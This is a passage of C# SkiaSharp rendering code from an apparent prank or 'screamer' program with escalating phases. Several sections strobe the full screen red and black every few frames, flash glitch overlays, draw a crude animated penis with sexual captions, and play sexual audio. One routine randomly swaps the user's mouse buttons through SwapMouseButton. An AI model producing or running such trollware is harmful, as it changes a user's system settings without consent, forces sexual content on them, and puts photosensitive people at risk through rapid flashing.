                    whiskerPath.MoveTo(40, 10); whiskerPath.LineTo(90, 0); whiskerPath.MoveTo(40, 20); whiskerPath.LineTo(95, 20); whiskerPath.MoveTo(40, 30); whiskerPath.LineTo(90, 40);
                    canvas.DrawPath(whiskerPath, pBlack);
                    var mouthPath = new SKPath();
                    mouthPath.MoveTo(-20, 25); mouthPath.QuadTo(0, 45, 0, 25); mouthPath.MoveTo(0, 25); mouthPath.QuadTo(0, 45, 20, 25);
                    canvas.DrawPath(mouthPath, new SKPaint { Color = SKColors.Black, Style = SKPaintStyle.Stroke, StrokeWidth = 4, IsAntialias = true });
                }
                canvas.Restore();

                canvas.Restore(); 
                return;
            }
            
            // === MODE BLEED (Saignement) ===
            if (_gameMode == "BLEED")
            {
                canvas.Clear(new SKColor(20, 0, 0));
                using (var p = new SKPaint { Color = new SKColor(180, 0, 0) })
                {
                    float colWidth = w / 60f;
                    for (int i = 0; i < 60; i++)
                    {
                        canvas.DrawRect(i * colWidth, 0, colWidth + 2, _bloodY[i], p);
                        _bloodY[i] += _bloodSpeed[i];
                        if (_bloodY[i] > h) _bloodY[i] = h; // Remplir
                    }
                }
                
                // Flash d'image terrifiant
                if (_imgRirimiaou != null && _frameCount % 90 < 15)
                {
                    using (var paint = new SKPaint { Color = new SKColor(255, 255, 255, 180) })
                    {
                        canvas.DrawBitmap(_imgRirimiaou, new SKRect(0, 0, w, h), paint);
                    }
                }
                
                // Texte qui pulse
                int bleedAlpha = (int)(150 + Math.Sin(_frameCount / 5.0) * 100);
                using (var pTxt = new SKPaint { Color = new SKColor(255, 0, 0, (byte)Math.Clamp(bleedAlpha, 0, 255)), IsAntialias = true })
                using (var fTxt = new SKFont(SKTypeface.FromFamilyName("Impact"), 120))
                {
                    string txt = "TROP LENT";
                    float tw = fTxt.MeasureText(txt);
                    canvas.DrawText(txt, w / 2f - tw / 2, h / 2f, SKTextAlign.Left, fTxt, pTxt);
                }
                
                canvas.Restore();
                return;
            }
            
            // === MODE RIRI ===
            
            // Stroboscope
            if (_drawStrobe)
            {
                _strobeCounter++;
                if (_strobeCounter % 4 < 2)
                    canvas.Clear(new SKColor(255, 0, 0, 240));
                else
                    canvas.Clear(new SKColor(0, 0, 0, 240));
            }
            
            // Anomalie pulsante
            if (_drawAnomalies && !_drawStrobe)
            {
                byte alpha = (byte)(20 + (Math.Sin(Environment.TickCount / 300.0) * 20));
                canvas.DrawRect(0, 0, w, h, new SKPaint { Color = new SKColor(255, 0, 0, alpha) });
            }

            // Distorsion glitch lines
            if (_drawDistortion && !_drawStrobe)
            {
                using (SKPaint paint = new SKPaint { Color = new SKColor(0, 0, 0, 150), StrokeWidth = 3, IsAntialias = true })
                {
                    for (int i = 0; i < 30; i++)
                    {
                        float x1 = _rng.Next(w);
                        float y1 = _rng.Next(h);
                        float x2 = x1 + _rng.Next(-200, 200);
                        float y2 = y1 + _rng.Next(-200, 200);
                        canvas.DrawLine(x1, y1, x2, y2, paint);
                    }
                }
            }

            int currentTheme = (_frameCount / 200) % 4; // Change de thème toutes les ~3.3 secondes

            // ========== THEME 0 & 1 : RIRIMIAOU & BRAWL STARS (Fade-In Smooth + SVG) ==========
            // Visibilité douce en sinusoïde, qui devient permanente en Phase 4
            float fadeSpeed = _currentPhase >= 4 ? 0.2f : (0.02f * _currentPhase);
            int baseAlphaImg = _currentPhase >= 4 ? 200 : (int)(Math.Sin(_frameCount * fadeSpeed) * 200);
            byte alphaImg = (byte)Math.Clamp(baseAlphaImg, 0, 255);
            
            if (currentTheme == 0 && alphaImg > 0)
            {
                float time = _frameCount / 15.0f;
                float imgSize = 500 + (float)Math.Sin(time * 5) * 80;
                float imgX = (w / 2f) - (imgSize / 2f) + (float)Math.Sin(time * 12) * 200;
                float imgY = (h / 2f) - (imgSize / 2f) + (float)Math.Cos(time * 9) * 100;
                
                canvas.Save();
                canvas.RotateDegrees((float)Math.Sin(time * 6) * 45, imgX + imgSize/2, imgY + imgSize/2);
                
                // Dessin Bitmap optionnel si présent
                if (_imgRirimiaou != null)
                {
                    float imgH = imgSize * _imgRirimiaou.Height / _imgRirimiaou.Width;
                    using (var paint = new SKPaint { Color = SKColors.White.WithAlpha(alphaImg), IsAntialias = true })
                    {
                        canvas.DrawBitmap(_imgRirimiaou, new SKRect(imgX, imgY, imgX + imgSize, imgY + imgH), paint);
                    }
                }

                if (_currentPhase == 1)
                {
                    // DESSIN SVG MAMAN BLZSTARS (Mignonne et Rassurante)
                    canvas.Translate(imgX + imgSize/2, imgY + imgSize/2 + 200);
                    canvas.Scale(2.5f + (float)Math.Sin(time*2)*0.2f); // Respiration calme
                    
                    using (var pSkin = new SKPaint { Color = new SKColor(255, 224, 189, alphaImg), Style = SKPaintStyle.Fill, IsAntialias = true })
                    using (var pHair = new SKPaint { Color = new SKColor(139, 69, 19, alphaImg), Style = SKPaintStyle.Fill, IsAntialias = true })
                    using (var pEar = new SKPaint { Color = new SKColor(255, 204, 153, alphaImg), Style = SKPaintStyle.Fill, IsAntialias = true })
                    using (var pEye = new SKPaint { Color = SKColors.Black.WithAlpha(alphaImg), Style = SKPaintStyle.Fill, IsAntialias = true })
                    using (var pMouth = new SKPaint { Color = SKColors.IndianRed.WithAlpha(alphaImg), Style = SKPaintStyle.StrokeAndFill, StrokeWidth=2, IsAntialias = true })
                    using (var pText = new SKPaint { Color = SKColors.DeepPink.WithAlpha(alphaImg), IsAntialias = true })
                    using (var font = new SKFont(SKTypeface.FromFamilyName("Arial", SKFontStyleWeight.Bold, SKFontStyleWidth.Normal, SKFontStyleSlant.Italic), 24))
                    {
                        // Cheveux derrière
                        canvas.DrawCircle(0, -20, 85, pHair);
                        // Visage
                        canvas.DrawCircle(0, 0, 70, pSkin);
                        // Cheveux devant (frange)
                        var hairFront = new SKPath();
                        hairFront.MoveTo(-70, 0); hairFront.QuadTo(0, -50, 70, 0); hairFront.LineTo(70, -70); hairFront.LineTo(-70, -70);
                        canvas.DrawPath(hairFront, pHair);
                        
                        // Yeux doux (fermés / souriants)
                        var eyePath = new SKPath();
                        eyePath.MoveTo(-35, -5); eyePath.QuadTo(-25, -15, -15, -5);
                        eyePath.MoveTo(15, -5); eyePath.QuadTo(25, -15, 35, -5);
                        canvas.DrawPath(eyePath, new SKPaint { Color = SKColors.Black.WithAlpha(alphaImg), Style = SKPaintStyle.Stroke, StrokeWidth = 3, IsAntialias = true });
                        
                        // Petite bouche souriante
                        var smilePath = new SKPath();
                        smilePath.MoveTo(-15, 15); smilePath.QuadTo(0, 30, 15, 15);
                        canvas.DrawPath(smilePath, new SKPaint { Color = SKColors.IndianRed.WithAlpha(alphaImg), Style = SKPaintStyle.Stroke, StrokeWidth = 3, IsAntialias = true });
                        
                        // Rougeurs
                        using (var pCheek = new SKPaint { Color = SKColors.HotPink.WithAlpha((byte)(alphaImg/2)), Style = SKPaintStyle.Fill, IsAntialias=true })
                        {
                            canvas.DrawCircle(-35, 10, 12, pCheek);
                            canvas.DrawCircle(35, 10, 12, pCheek);
                        }

                        // Texte
                        string mamanText = "Blz, va manger chéri ! :3";
                        canvas.DrawText(mamanText, 0, -100, SKTextAlign.Center, font, pText);
                    }
                }
                else
                {
                    // DESSIN DU SVG RIRIMIAOU (Chat Mignon/Dégénéré) SUR L'ECRAN (Phase 2+)
                    canvas.Translate(imgX + imgSize/2, imgY + imgSize/2 + 200);
                    // Explosion si Phase 2, sinon glitch scale
                    float distortion = _currentPhase >= 3 ? (float)Math.Tan(time * 20) * 0.5f : 0;
                    canvas.Scale(2.0f + (float)Math.Sin(time*3)*0.5f + distortion);
                
                using (var pPink = new SKPaint { Color = SKColors.Pink.WithAlpha(alphaImg), Style = SKPaintStyle.Fill, IsAntialias = true })
                using (var pWhite = new SKPaint { Color = SKColors.White.WithAlpha(alphaImg), Style = SKPaintStyle.Fill, IsAntialias = true })
                using (var pBlack = new SKPaint { Color = SKColors.Black.WithAlpha(alphaImg), Style = SKPaintStyle.StrokeAndFill, StrokeWidth = 3, IsAntialias = true })
                {
                    // Tête du chat ronde
                    canvas.DrawCircle(0, 0, 80, pPink);
                    canvas.DrawCircle(0, 0, 80, pBlack);
                    
                    // Oreilles (Triangles)
                    var earPath = new SKPath();
                    earPath.MoveTo(-70, -40); earPath.LineTo(-90, -100); earPath.LineTo(-20, -75);
                    earPath.MoveTo(70, -40); earPath.LineTo(90, -100); earPath.LineTo(20, -75);
                    canvas.DrawPath(earPath, pPink);
                    canvas.DrawPath(earPath, new SKPaint { Color = SKColors.Black.WithAlpha(alphaImg), Style = SKPaintStyle.Stroke, StrokeWidth = 3, IsAntialias = true });
                    
                    // Yeux (Grands animés)
                    canvas.DrawCircle(-30, -10, 20, pWhite);
                    canvas.DrawCircle(30, -10, 20, pWhite);
                    canvas.DrawCircle(-30, -10, 8, pBlack); 
                    canvas.DrawCircle(30, -10, 8, pBlack);
                    
                    // Moustaches (Lignes)
                    var whiskerPath = new SKPath();
                    whiskerPath.MoveTo(-40, 10); whiskerPath.LineTo(-90, 0);
                    whiskerPath.MoveTo(-40, 20); whiskerPath.LineTo(-95, 20);
                    whiskerPath.MoveTo(-40, 30); whiskerPath.LineTo(-90, 40);
                    
                    whiskerPath.MoveTo(40, 10); whiskerPath.LineTo(90, 0);
                    whiskerPath.MoveTo(40, 20); whiskerPath.LineTo(95, 20);
                    whiskerPath.MoveTo(40, 30); whiskerPath.LineTo(90, 40);
                    canvas.DrawPath(whiskerPath, pBlack);
                    
                    // Bouche en "UwU" ou ":3"
                    var mouthPath = new SKPath();
                    mouthPath.MoveTo(-20, 25); mouthPath.QuadTo(0, 45, 0, 25);
                    mouthPath.MoveTo(0, 25); mouthPath.QuadTo(0, 45, 20, 25);
                    canvas.DrawPath(mouthPath, new SKPaint { Color = SKColors.Black.WithAlpha(alphaImg), Style = SKPaintStyle.Stroke, StrokeWidth = 4, IsAntialias = true });
                }
                } // Fin Else (Phase >= 2)
                
                canvas.Restore();
            }

            if (currentTheme == 1 && _imgBrawlStars != null && alphaImg > 0)
            {
                float time = _frameCount / 10.0f;
                float bsSize = 500 + (float)Math.Cos(time * 4) * 100;
                float bsH = bsSize * _imgBrawlStars.Height / _imgBrawlStars.Width;
                float bsX = (w / 2f) - (bsSize / 2f) + (float)Math.Cos(time * 10) * 300;
                float bsY = (h / 2f) - (bsH / 2f) + (float)Math.Sin(time * 8) * 200;
                
                canvas.Save();
                canvas.RotateDegrees((float)Math.Cos(time * 5) * -45, bsX + bsSize/2, bsY + bsH/2);
                using (var paint = new SKPaint { Color = SKColors.White.WithAlpha(alphaImg), IsAntialias = true })
                {
                    canvas.DrawBitmap(_imgBrawlStars, new SKRect(bsX, bsY, bsX + bsSize, bsY + bsH), paint);
                }
                canvas.Restore();
            }

            // ========== THEME 2 : ZIZI EXTRÊME GOOFY (NSFW + Smooth Overlay) ==========
            // Le Zizi apparaît en fondu croisé par rapport aux images, ou tourne au premier plan
            float ziziFadeSpeed = _currentPhase >= 3 ? 0.3f : (0.015f * _currentPhase);
            int baseAlphaZizi = _currentPhase >= 3 ? 255 : (int)(Math.Sin((_frameCount + 100) * ziziFadeSpeed) * 300);
            byte alphaZizi = (byte)Math.Clamp(baseAlphaZizi, 0, 255);
            
            // On l'affiche toujours si son opacité le permet (superposition lisse)
            if (alphaZizi > 10)
            {
                // EFFETS WTF++++ : Fond de flashs roses/violets agressifs
                using (var pBg = new SKPaint { Color = new SKColor((byte)_rng.Next(150, 255), 0, (byte)_rng.Next(100, 255), 70) })
                {
                    canvas.DrawRect(0, 0, w, h, pBg);
                }
                
                float time = _frameCount / 8.0f; // Hyper rapide 
                // Assure que le zizi reste majoritairement au centre et ne sort pas completement de l'écran :
                float zx = w / 2f + (float)Math.Cos(time * 3.5f) * (w / 4f) + _rng.Next(-40, 40); 
                float zy = h / 2f + (float)Math.Sin(time * 2.8f) * (h / 4f) + _rng.Next(-40, 40);
                
                // Scale MASSIF auto-adaptatif :
                float scale = ((w + h) / 2000f) + 2.0f + (float)Math.Sin(time * 6) * 1.5f; 
                float rotationAngle = time * 40 + (float)Math.Sin(time * 1.5f) * 120; // Tournoie frénétiquement
                
                canvas.Save();
                canvas.Translate(zx, zy);
                canvas.RotateDegrees(rotationAngle);
                canvas.Scale(scale);
                
                byte rSkin = (byte)(255 - Math.Abs(Math.Sin(time * 2) * 50));
                byte gSkin = (byte)(140 + Math.Abs(Math.Cos(time * 3) * 50));
                byte bSkin = (byte)(190 + Math.Abs(Math.Sin(time * 4) * 50));
                
                using (var pSkin = new SKPaint { Color = new SKColor(rSkin, gSkin, bSkin, alphaZizi), IsAntialias = true })
                using (var pSkinDark = new SKPaint { Color = new SKColor((byte)(rSkin-30), (byte)(gSkin-50), (byte)(bSkin-50), alphaZizi), IsAntialias = true })
                using (var pOutline = new SKPaint { Color = SKColors.Black.WithAlpha(alphaZizi), Style = SKPaintStyle.Stroke, StrokeWidth = 8, StrokeJoin = SKStrokeJoin.Round, IsAntialias = true })
                using (var pHair = new SKPaint { Color = SKColors.Black.WithAlpha(alphaZizi), Style = SKPaintStyle.Stroke, StrokeWidth = 4, StrokeCap = SKStrokeCap.Round, IsAntialias = true })
                using (var pVein = new SKPaint { Color = new SKColor(100, 50, 200, (byte)Math.Min(150, (int)alphaZizi)), Style = SKPaintStyle.Stroke, StrokeWidth = 6, StrokeCap = SKStrokeCap.Round, IsAntialias = true })
                using (var pTip = new SKPaint { Color = new SKColor(255, 20, 100, alphaZizi), IsAntialias = true })
                using (var pWhite = new SKPaint { Color = SKColors.White.WithAlpha(alphaZizi), IsAntialias = true })
                using (var pBlack = new SKPaint { Color = SKColors.Black.WithAlpha(alphaZizi), IsAntialias = true })
                using (var pSperm = new SKPaint { Color = new SKColor(255, 255, 255, (byte)Math.Min(200, (int)alphaZizi)), IsAntialias = true })
                {
                    // Les bourses 
                    canvas.Save();
                    float bounceL = (float)Math.Sin(time * 12) * 20;
                    float bounceR = (float)Math.Cos(time * 10) * 20;
                    
                    canvas.DrawCircle(-70, 90 + bounceL, 80, pSkinDark);  canvas.DrawCircle(-70, 90 + bounceL, 80, pOutline);
                    canvas.DrawCircle(60, 110 + bounceR, 95, pSkinDark); canvas.DrawCircle(60, 110 + bounceR, 95, pOutline);
                    
                    var vPath = new SKPath();
                    vPath.MoveTo(-100, 90 + bounceL); vPath.QuadTo(-70, 50 + bounceL, -40, 120 + bounceL);
                    vPath.MoveTo(20, 110 + bounceR); vPath.CubicTo(60, 70 + bounceR, 100, 150 + bounceR, 60, 180 + bounceR);
                    canvas.DrawPath(vPath, pVein);

                    for (int i=0; i<12; i++) {
                        float hlen = 25 + _rng.Next(-5, 10);
                        canvas.DrawLine(-70 - i*6, 170 + bounceL, -80 - i*12, 170 + bounceL + hlen, pHair);
                        canvas.DrawLine(60 + i*6, 205 + bounceR, 70 + i*12, 205 + bounceR + hlen, pHair);
                    }
                    canvas.Restore();
                    
                    // Corps
                    float bend = (float)Math.Sin(time * 7) * 80; 
                    float thick = 60 + (float)Math.Sin(time * 15) * 15; 
                    
                    var bodyPath = new SKPath();
                    bodyPath.MoveTo(-thick, 60); bodyPath.LineTo(thick, 60);
                    bodyPath.CubicTo(thick + 10, -50, thick + bend + 20, -150, thick + bend, -280);
                    bodyPath.LineTo(-thick + bend, -280); 
                    bodyPath.CubicTo(-thick + bend - 20, -150, -thick - 10, -50, -thick, 60); 
                    bodyPath.Close();
                    
                    canvas.DrawPath(bodyPath, pSkin); canvas.DrawPath(bodyPath, pOutline);

                    var mainVein = new SKPath();
                    mainVein.MoveTo(0, 40); mainVein.CubicTo(bend/2 + 20, -100, bend/2 - 20, -200, bend, -260);
                    canvas.DrawPath(mainVein, pVein);
                    
                    // Gland
                    float tipScale = 1.0f + (float)Math.Sin(time * 20) * 0.2f;
                    canvas.Save();
                    canvas.Translate(bend, -300); canvas.Scale(tipScale);
                    canvas.DrawRoundRect(-80, -60, 160, 120, 80, 60, pTip); canvas.DrawRoundRect(-80, -60, 160, 120, 80, 60, pOutline);
                    canvas.DrawLine(0, -50, 0, 20, pOutline);

                    using (var pFont = new SKPaint { Color = SKColors.White, IsAntialias = true })
                    using (var skFont = new SKFont(SKTypeface.FromFamilyName("Comic Sans MS", SKFontStyleWeight.Bold, SKFontStyleWidth.Normal, SKFontStyleSlant.Upright), 40)) {
                         canvas.DrawText("UwU", -35, 10, SKTextAlign.Left, skFont, pFont);
                    }

                    if (_frameCount % 2 == 0) { // Crachat ++
                        for(int i=0; i<15; i++) { // 15 gouttes
                           float spX = _rng.Next(-250, 250) + (float)Math.Sin(time*40)*100;
                           float spY = -120 - _rng.Next(20, 800); // Gicle super loin
                           canvas.DrawCircle(spX, spY, _rng.Next(15, 60), pSperm);
                        }
                    }
                    canvas.Restore();
                    
                    float eyeOffset1 = (float)Math.Cos(time * 25) * 8; float eyeOffset2 = (float)Math.Sin(time * 22) * 8;
                    canvas.DrawCircle(-20 + bend/2, -150, 30, pWhite); canvas.DrawCircle(30 + bend/2, -120, 35, pWhite);
                    canvas.DrawCircle(-20 + bend/2 + eyeOffset1, -150 + eyeOffset2, 12, pBlack); canvas.DrawCircle(30 + bend/2 + eyeOffset2, -120 + eyeOffset1, 15, pBlack);
                }
                
                canvas.Restore();
            }

            // ========== THEME 3 : ASTERION / PUNISHER ==========
            if (currentTheme == 3 && _imgPunisher != null)
            {
                float time = _frameCount / 8.0f;
                float iw = 600 + (float)Math.Sin(time * 10) * 100;
                float ih = iw * _imgPunisher.Height / _imgPunisher.Width;
                float ix = (w / 2f) - (iw / 2f);
                float iy = (h / 2f) - (ih / 2f);
                
                // Effet stroboscopique sur l'image
                if (_frameCount % 4 < 2)
                {
                    using (var paint = new SKPaint { IsAntialias = true })
                    {
                        canvas.DrawBitmap(_imgPunisher, new SKRect(ix, iy, ix + iw, iy + ih), paint);
                    }
                }
            }

            // ==== EFFETS WTF UNIVERSELS (Glitch boxes, Textes) ====
            if (_drawGlitchBoxes && !_drawStrobe)
            {
                for (int i = 0; i < 40; i++)
                {
                    float bx = _rng.Next(w);
                    float by = _rng.Next(h);
                    float bw = _rng.Next(50, 600);
                    float bh = _rng.Next(10, 150);
                    
                    SKColor c = _rng.Next(2) == 0 ? SKColors.Black : SKColors.White;
                    using (var p = new SKPaint { Color = c })
                    {
                        canvas.DrawRect(bx, by, bw, bh, p);
                    }
                }
            }
            
            if (_currentPhase >= 2)
            {
                // Routine périodique : Swap Clic VTuber aléatoire si actif
                if (_ririmiaouSyndromeActive && _frameCount % 600 == 0) // Toutes les ~10s
                {
                     // Inversion aléatoire des clics
                     SwapMouseButton(_rng.Next(2));
                     _mp3Anime.Position = TimeSpan.Zero;
                     _mp3Anime.Play();
                }
                
                // Sélection des textes selon le thème
                string[] textsTheme0 = { "RIRIMIAOU", "UWAAAH", "MIAOU", "LOL", "PETIT CHAT", "Dédicace à Blz mon bb ❤️", "S/o Les Queens (Modos) 👑" };
                string[] textsTheme1 = { "BRAWL STARS", "EL PRIMO !!", "SHELLY OH OUI", "GEMMES GRATUITES", "BLZ LE BOSS", "MODOS SURPUISSANTES" };
                string[] textsTheme2 = { "AHEGAO", "YAMETE KUDASAI", "SQUIRT", "MHHHH~", "ZIZI" };
                string[] textsTheme3 = { "ASTERIONN", "WTF", "PUNISHER", "💀" };
                
                string[] currentTexts = textsTheme0;
                if (currentTheme == 1) currentTexts = textsTheme1;
                else if (currentTheme == 2) currentTexts = textsTheme2;
                else if (currentTheme == 3) currentTexts = textsTheme3;
                // Textes WTF Riri : Plus rares et espacés en Phase 1, harcelants en Phase 4
                int txtVisibility = _currentPhase >= 4 ? 60 : (_currentPhase * 6); 
                int txtDelay = _currentPhase >= 4 ? 6 : (120 / _currentPhase);
                
                if (_frameCount % 15 < 6 && _frameCount % txtDelay < txtVisibility)
                {
                    string txt = currentTexts[_rng.Next(currentTexts.Length)];

                    // Audio
                    if (_frameCount % (150 / _currentPhase) == 0 && currentTheme == 0) {
                        _mp3Anime.Position = TimeSpan.Zero;
                        _mp3Anime.Play();
                    } else if (_frameCount % (150 / _currentPhase) == 0 && currentTheme == 2) {
                        _mp3Ah.Position = TimeSpan.Zero;
                        _mp3Ah.Play();
                    }
                    else if (txt == "ASTERIONN" && _frameCount % 30 < 5) 
                    {
                        _mp3Asterion.Position = TimeSpan.Zero;
                        _mp3Asterion.Play();
                    }
                    else if (txt == "UWAAAH" && _frameCount % 30 < 5)
                    {
                        _mp3Duck.Position = TimeSpan.Zero;
                        _mp3Duck.Play();
                    }
                    else if ((txt == "AHEGAO" || txt == "YAMETE KUDASAI" || txt == "SQUIRT" || txt == "MHHHH~") && _frameCount % 30 < 5)
                    {
                        PlayAudioAsync("sex.wav");
                    }
                    else if (_frameCount % 40 == 0)
                    {
                        if (_rng.Next(2) == 0) {
                            _mp3Goofy.Position = TimeSpan.Zero;
                            _mp3Goofy.Play();
                        } else {
                            _mp3Rizz.Position = TimeSpan.Zero;
                            _mp3Rizz.Play();
                        }
                    }

                    using (var pTxt = new SKPaint
                    {
                        Color = new SKColor((byte)_rng.Next(256), (byte)_rng.Next(256), (byte)_rng.Next(256)),
                        IsAntialias = true
                    })
                    // Augmentation COLOSSALE de la taille des textes WTF (jusqu'à 500)
                    using (var fTxt = new SKFont(SKTypeface.FromFamilyName("Comic Sans MS", SKFontStyleWeight.Bold, SKFontStyleWidth.Normal, SKFontStyleSlant.Upright), _rng.Next(100, 500)))
                    {
                        float tw = fTxt.MeasureText(txt);
                        // Ajout de shake textuel
                        float txtX = _rng.Next(0, Math.Max(1, w - (int)tw)) + _rng.Next(-30, 30);
                        float txtY = _rng.Next(100, h - 50) + _rng.Next(-30, 30);
                        canvas.DrawText(txt, txtX, txtY, SKTextAlign.Left, fTxt, pTxt);
                    }
                }
                
                // Lignes horizontales décalées
                if (_frameCount % 7 < 3)
                {
                    using (var p = new SKPaint { Color = new SKColor(0, 255, 0, 40) })
                    {
                        for (int i = 0; i < 10; i++)
                        {
                            canvas.DrawRect(_rng.Next(-50, 50), _rng.Next(h), w + 100, _rng.Next(2, 8), p);
                        }
                    }
                }
                
                // === POST-PROCESS MADNESS WTF++++ ===
                if (_currentPhase >= 3)
                {
                    // Lignes statiques Exclusion (Glitch noir/blanc partout)
                    using (var pGlitch = new SKPaint { Color = SKColors.White, BlendMode = SKBlendMode.Exclusion })
                    {
                        for (int i = 0; i < (_currentPhase * 5); i++)
                        {
                            canvas.DrawRect(_rng.Next(w), _rng.Next(h), _rng.Next(50, w/2), _rng.Next(2, 20), pGlitch);
                        }
                    }
                }
                if (_currentPhase >= 4 && _frameCount % 12 < 4)
                {
                    // Inversion psychédélique de toutes les couleurs (Strobe absolu)
                    using (var pInvert = new SKPaint { Color = SKColors.Red, BlendMode = SKBlendMode.Difference })
                    {
                        canvas.DrawRect(0, 0, w, h, pInvert);
                    }
                }
            }
            
            canvas.Restore();
        }

        private void PlayAudioAsync(string fileName, bool loop = false)
        {
            Task.Run(() =>
            {
                string path = Path.Combine(_assetDir, fileName);
                if (File.Exists(path))
                {
                    try
                    {
                        using (var player = new SoundPlayer(path))
                        {
                            if (loop) player.PlayLooping();
                            else player.Play();
                        }
                    }
                    catch { }
                }
            });
        }
    }
}